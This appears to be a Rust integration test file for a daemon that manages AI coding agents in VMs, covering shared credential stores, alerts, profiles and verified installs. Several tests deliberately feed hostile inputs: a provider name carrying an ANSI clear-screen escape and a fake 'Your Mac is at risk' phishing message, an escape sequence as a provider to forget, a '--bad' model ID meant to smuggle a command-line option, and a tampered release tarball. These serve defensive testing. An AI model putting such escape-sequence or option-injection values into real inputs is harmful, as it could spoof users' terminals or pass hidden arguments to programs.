    w.wait_screen(&r, "No API key found for stripe").await;
    w.wait_for(&r, Activity::Done).await;
    send("/model").await;
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    let (_, activity, _) = w.state(&r).await;
    assert_eq!(activity, Activity::Done);
    w.delete(&r).await;
}

/// S5, through the daemon: what an agent offered is listed, and forgotten on the
/// owner's word, from every copy.
#[tokio::test]
async fn the_owner_forgets_what_an_agent_offered_and_it_goes_from_every_copy() {
    let w = world().await;
    w.sign_in();
    let (hostile, other) = (w.start("one").await.agent, w.start("two").await.agent);
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = |r: &str| w.layout.agent_dir(r).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(
        copy(&hostile).join("auth.json"),
        r#"{"mock":{"type":"api_key","key":"fake"},
            "junk-a":{"type":"api_key","key":"a"},
            "junk-b":{"type":"api_key","key":"b"}}"#,
    )
    .unwrap();
    w.core.pi_watch(&mut seen).await;
    w.core.pi_watch(&mut seen).await;
    assert_eq!(
        vibe_env::pi::logins_in(&copy(&other)),
        ["junk-a", "junk-b", "mock"]
    );
    let vms = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap();
    assert_eq!(vms.offered.len(), 2);
    assert_eq!(vms.offered[0].provider, "junk-a");
    assert_eq!(vms.offered[0].agent, hostile);
    let (_, mut events) = w.core.subscribe();
    let after = w
        .core
        .pi_forget(vibe_core::rpc::PiForgetParams {
            host: None,
            providers: vec!["junk-a".into(), "junk-b".into()],
        })
        .await
        .unwrap();
    let vms = after.vms.unwrap();
    assert_eq!(vms.logins, ["mock"]);
    assert!(vms.offered.is_empty());
    assert!(vms.alerts.is_empty(), "{:?}", vms.alerts);
    assert_eq!(
        events.try_recv().unwrap().kind,
        vibe_core::model::EventKind::PiChanged
    );
    w.core.pi_watch(&mut seen).await;
    assert_eq!(vibe_env::pi::logins_in(&copy(&other)), ["mock"]);
    assert_eq!(vibe_env::pi::logins_in(&copy(&hostile)), ["mock"]);
    let e = w
        .core
        .pi_forget(vibe_core::rpc::PiForgetParams {
            host: None,
            providers: vec!["\u{1b}[2J".into()],
        })
        .await
        .unwrap_err();
    assert_eq!(e.code, ErrorCode::InvalidParams.code());
    w.delete(&hostile).await;
    w.delete(&other).await;
}

/// R3, through the daemon: however it got there, an alert is only text.
#[tokio::test]
async fn an_alert_a_guest_wrote_reaches_no_terminal() {
    let w = world().await;
    w.sign_in();
    let r = w.start("hello").await.agent;
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let copy = w.layout.agent_dir(&r).join(vibe_env::pi::VM_AGENT_DIR);
    let phish = format!("\\u001b[2JYour Mac is at risk {}", "x".repeat(100_000));
    fs::write(
        copy.join("auth.json"),
        format!(r#"{{"{phish}":{{"type":"api_key","key":"k"}}}}"#),
    )
    .unwrap();
    let (_, mut events) = w.core.subscribe();
    w.core.pi_watch(&mut seen).await;
    let vms = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap();
    assert_eq!(vms.alerts.len(), 1, "{:?}", vms.alerts);
    let event = events.try_recv().unwrap().message.unwrap();
    for said in [&vms.alerts[0], &event] {
        assert!(!said.contains("at risk"), "{said}");
        assert!(!said.contains('\u{1b}'), "{said}");
        assert!(said.len() < 1000, "{}", said.len());
        assert!(said.contains(&r), "{said}");
    }
    w.delete(&r).await;
}

/// N2: one copy looking fine after another found the store bad doesn't hide it.
#[tokio::test]
async fn a_bad_store_stays_told_of_whichever_copy_looks_last() {
    let w = world().await;
    w.sign_in();
    let (a, b) = (w.start("one").await.agent, w.start("two").await.agent);
    let mut seen = None;
    w.core.pi_watch(&mut seen).await;
    let store = w.layout.linux_pi_logins_dir().join("auth.json");
    let good = fs::read_to_string(&store).unwrap();
    fs::write(&store, "not json").unwrap();
    // One of them quarantined all the same, so a look at it isn't about the store.
    let copy = w.layout.agent_dir(&b).join(vibe_env::pi::VM_AGENT_DIR);
    fs::write(copy.join("auth.json"), "not json").unwrap();
    w.core.pi_watch(&mut seen).await;
    let alerts = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap()
        .alerts;
    assert!(
        alerts.iter().any(|a| a.contains("can't be kept in step")),
        "{alerts:?}"
    );
    fs::write(&store, good).unwrap();
    fs::write(copy.join("auth.json"), "{}").unwrap();
    w.core.pi_watch(&mut seen).await;
    let alerts = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap()
        .alerts;
    assert!(alerts.is_empty(), "{alerts:?}");
    w.delete(&a).await;
    w.delete(&b).await;
}

/// N5: what the broker keeps going bad reaches Settings, not silence.
#[tokio::test]
async fn what_the_broker_keeps_going_bad_is_told_of() {
    let w = world().await;
    w.sign_in();
    let dir = w.layout.linux_pi_logins_dir();
    fs::write(dir.join(vibe_env::pi_logins::NOTICES_FILE), "not json").unwrap();
    let alerts = w
        .core
        .pi_status(HostParams { host: None })
        .await
        .unwrap()
        .vms
        .unwrap()
        .alerts;
    assert_eq!(alerts.len(), 1, "{alerts:?}");
    assert!(alerts[0].contains("notices.json"), "{alerts:?}");
}

/// Delete takes its sessions and its copy, and nothing of the store.
#[tokio::test]
async fn a_delete_keeps_the_login_every_agent_shares() {
    let w = world().await;
    w.sign_in();
    let (one, two) = (w.start("one").await, w.start("two").await);
    let (a, b) = (one.agent.clone(), two.agent.clone());
    w.wait_for(&a, Activity::Done).await;
    w.wait_for(&b, Activity::Done).await;
    w.delete(&a).await;
    assert!(!w.layout.agent_dir(&a).exists());
    assert!(w.layout.linux_pi_logins_dir().join("auth.json").is_file());
    let (_, activity, _) = w.state(&b).await;
    assert_eq!(activity, Activity::Done, "the other's unharmed");
    w.delete(&b).await;
}

/// F3: the login goes under a running agent, and a send fails before Pi writes
/// anything. It read as done, and `vibe_wait` waited on for ever.
#[tokio::test]
async fn a_later_turn_that_fails_before_it_starts_is_shown_and_answers_the_wait() {
    let w = world().await;
    w.sign_in();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Done).await;
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "nologin".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(!check.answered, "too soon to say");
    w.wait_for(&r, Activity::Errored).await;
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let agent = list.agents.iter().find(|x| x.agent == r).unwrap();
    assert!(
        agent
            .status
            .error
            .as_deref()
            .unwrap()
            .contains("No API key"),
        "{:?}",
        agent.status.error
    );
    assert_eq!(agent.state, AgentState::Idle);
    let check = w.core.check_agent(None, &r, false).await.unwrap();
    assert!(check.answered, "the wait is over");
    assert_eq!(check.activity, Activity::Errored);
    // And once it's told to try again and can, that's what it reads as.
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "again".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    w.wait_screen(&r, "Working on: again").await;
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

/// N2: signed in again and told to go on, with the old error still on screen, a
/// turn that takes a while has written nothing past its prompt yet. It's working.
#[tokio::test]
async fn a_running_turn_isnt_failed_by_the_error_above_it() {
    let w = world().await;
    w.sign_in();
    let a = w.start("nologin").await;
    let r = a.agent.clone();
    w.wait_for(&r, Activity::Errored).await;
    w.core
        .send_input(
            None,
            &r,
            vibe_mcp::Input::Text {
                text: "think 8".into(),
                submit: true,
                force: false,
            },
        )
        .await
        .unwrap();
    wait_until("its prompt on disk", || names(&w.sessions(&r)).len() == 1);
    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
    let (state, activity, _) = w.state(&r).await;
    assert_eq!(state, AgentState::Busy, "{activity}");
    assert_ne!(activity, Activity::Errored);
    w.wait_for(&r, Activity::Done).await;
    w.delete(&r).await;
}

/// Editing a profile never turns Pi's lack of approvals into a choice nobody
/// made, nor leaves Claude in bypass.
#[tokio::test]
async fn a_profile_moves_between_agents_and_environments_on_the_owners_word() {
    let w = world().await;
    let set = |p: ProfileUpdateParams| {
        w.core.update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            ..p
        })
    };
    // To the Mac it takes saying so.
    let e = set(ProfileUpdateParams {
        environment: Some(Environment::Macos),
        ..Default::default()
    })
    .unwrap_err();
    assert!(e.message.contains("never asks"), "{}", e.message);
    let moved = set(ProfileUpdateParams {
        environment: Some(Environment::Macos),
        mode: Some(Mode::Bypass),
        ..Default::default()
    })
    .unwrap();
    assert_eq!(moved.mode, Mode::Bypass);
    // Back, and on to Claude, which goes back to auto and forgets the model.
    let back = set(ProfileUpdateParams {
        environment: Some(Environment::Linux),
        ..Default::default()
    })
    .unwrap();
    assert_eq!(back.pi_model.as_deref(), Some("mock/mock-model"));
    let claude = set(ProfileUpdateParams {
        agent: Some(AgentKind::Claude),
        ..Default::default()
    })
    .unwrap();
    assert_eq!((claude.mode, claude.pi_model), (Mode::Auto, None));
    // A bad model is refused, before anything's saved.
    let e = set(ProfileUpdateParams {
        agent: Some(AgentKind::Pi),
        pi_model: Some("--bad".into()),
        ..Default::default()
    })
    .unwrap_err();
    assert!(e.message.contains("isn't a Pi model"), "{}", e.message);
    let profiles = w
        .core
        .profiles(ProjectParams {
            host: None,
            project: "app".into(),
        })
        .unwrap()
        .profiles;
    let saved = profiles.iter().find(|p| p.name == "pi-linux").unwrap();
    assert_eq!(saved.agent, AgentKind::Claude);
}

/// The Model field takes anything that's safe to pass on, and Pi gets it as it is.
#[tokio::test]
async fn a_bare_model_id_saves_and_goes_to_pi_as_it_is() {
    let w = world().await;
    w.sign_in();
    let saved = w
        .core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("deepseek-v4.1-flash".into()),
            ..Default::default()
        })
        .unwrap();
    assert_eq!(saved.pi_model.as_deref(), Some("deepseek-v4.1-flash"));
    let a = w.start("hello").await;
    let r = a.agent.clone();
    let args = w.started_with(&r, "args");
    let args: Vec<&str> = args.lines().collect();
    let at = args.iter().position(|a| *a == "--model").unwrap();
    assert_eq!(args[at + 1], "deepseek-v4.1-flash", "{args:?}");
    w.wait_screen(&r, "Working on: hello").await;
    w.delete(&r).await;
}

/// A model Pi won't take is Pi's to refuse, and the app says what it said, in place
/// of an agent that just reads as exited.
#[tokio::test]
async fn a_model_pi_wont_take_is_said_in_pis_words() {
    let w = world().await;
    w.sign_in();
    w.core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("no-such-model".into()),
            ..Default::default()
        })
        .unwrap();
    let a = w.start("hello").await;
    let r = a.agent.clone();
    let socket = w.layout.session_socket(&r);
    wait_until("it to exit", || {
        !socket.exists()
            && w.layout
                .agent_dir(&r)
                .join(vibe_core::shim::RECORD_FILE)
                .is_file()
    });
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let agent = list.agents.iter().find(|x| x.agent == r).unwrap();
    assert_eq!(agent.state, AgentState::Exited);
    assert_eq!(agent.status.activity, Activity::Errored);
    let said = agent.status.error.clone().unwrap_or_default();
    assert!(said.contains("Model \"no-such-model\" not found"), "{said}");
    assert!(!said.contains("--list-models"), "{said}");

    // Put right, the next session runs, and nothing of that stays.
    w.core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("mock/mock-model".into()),
            ..Default::default()
        })
        .unwrap();
    let b = w.start("hello again").await;
    w.wait_for(&b.agent, Activity::Done).await;
    let list = w.core.agents(HostParams { host: None }).await.unwrap();
    let agent = list.agents.iter().find(|x| x.agent == b.agent).unwrap();
    assert_eq!(agent.status.error, None);
    w.delete(&r).await;
    w.delete(&b.agent).await;
}

/// `pi auth check` says `invalid` of every bare id. That isn't a refusal, so with a
/// login Pi gets to try, and with none at all it's said that there's none.
#[tokio::test]
async fn a_bare_model_id_with_no_login_says_so_at_the_start() {
    let w = world().await;
    w.core
        .update_profile(ProfileUpdateParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            pi_model: Some("deepseek-v4.1-flash".into()),
            ..Default::default()
        })
        .unwrap();
    let e = w
        .core
        .start_agent(AgentStartParams {
            project: "app".into(),
            profile: "pi-linux".into(),
            prompt: "hello".into(),
            ..Default::default()
        })
        .await
        .unwrap_err();
    assert!(e.message.contains("any provider"), "{}", e.message);
}

#[tokio::test]
async fn pi_status_names_providers_and_never_what_they_hold() {
    let w = world().await;
    w.sign_in();
    let own = w.golden.home.join(".pi/agent");
    fs::create_dir_all(&own).unwrap();
    fs::write(
        own.join("auth.json"),
        r#"{"openai":{"type":"oauth","access":"sk-secret","refresh":"rt-secret","expires":1}}"#,
    )
    .unwrap();
    let status = w.core.pi_status(HostParams { host: None }).await.unwrap();
    assert_eq!(status.logins, ["openai"]);
    let vms = status.vms.as_ref().unwrap();
    assert_eq!(vms.logins, ["mock"]);
    assert_eq!(vms.version, None);
    let wire = serde_json::to_string(&status).unwrap();
    assert!(!wire.contains("secret"), "{wire}");
    let _: Value = serde_json::from_str(&wire).unwrap();
}

#[tokio::test]
async fn installing_for_vms_builds_a_checked_layer() {
    let tmp = tempfile::tempdir().unwrap();
    let releases = tmp.path().join("releases");
    let url = format!("file://{}", releases.display());
    let w = world_with(|c| c.pi_releases = url).await;
    let refused = w
        .core
        .pi_install(PiInstallParams {
            host: None,
            target: PiTarget::Vm,
        })
        .await
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::CommandFailed.code());
    // A tampered release is refused, and no layer comes of it.
    let pinned = vibe_env::pi_release::PINNED;
    publish_pi(&releases, pinned, vibe_env::pi_release::VM_PLATFORM);
    let tarball = releases.join(format!("download/v{pinned}/pi-linux-arm64.tar.gz"));
    let good = fs::read(&tarball).unwrap();
    fs::write(&tarball, b"tampered").unwrap();
    let e = w
        .core
        .pi_install(PiInstallParams {
            host: None,
            target: PiTarget::Vm,
        })
        .await
        .unwrap_err();
    assert!(e.message.contains("SHA-256"), "{}", e.message);
    let layer = w.layout.linux_dir().join(format!("pi-{pinned}.img"));
    assert!(!layer.exists());
    fs::write(&tarball, good).unwrap();
    // The version this build pins, whatever's newest there.
    publish_pi(&releases, "99.0.0", vibe_env::pi_release::VM_PLATFORM);
    let status = w
        .core
        .pi_install(PiInstallParams {
            host: None,
            target: PiTarget::Vm,
        })
        .await
        .unwrap();
    assert_eq!(status.vms.unwrap().version.as_deref(), Some(pinned));
    assert!(layer.is_file());
    assert!(!w.layout.linux_dir().join("pi-99.0.0.img").exists());
}
